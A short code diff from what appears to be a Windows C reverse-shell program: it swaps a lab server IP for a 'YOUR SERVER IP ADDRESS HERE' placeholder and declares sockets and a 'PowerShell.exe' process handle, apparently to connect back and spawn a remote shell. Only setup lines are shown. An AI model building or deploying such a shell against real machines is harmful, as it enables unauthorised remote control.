@@ -5,13 +5,13 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 
-char SERVER_IP[16] = "192.168.56.101";
-int SERVER_PORT = 8081;
+char SERVER_IP[16] = "xxx.xxx.xx.xxx"; //YOUR SERVER IP ADDRESS HERE. 
+int SERVER_PORT = 8081; //YOUR SERVER IP ADDRESS HERE. 
 SOCKET sockfd, newsockfd;
 struct sockaddr_in serv_addr;
 char input[512]; 
 WSADATA wsaDATA; // Variable to store data about the Windows socket.
-STARTUPINFO si; //STARTUPINFOA?
+STARTUPINFO si; //STARTUPINFOA as alternative?
 PROCESS_INFORMATION pi; // Contain information about a process. 
 char process[] = "PowerShell.exe ";
 
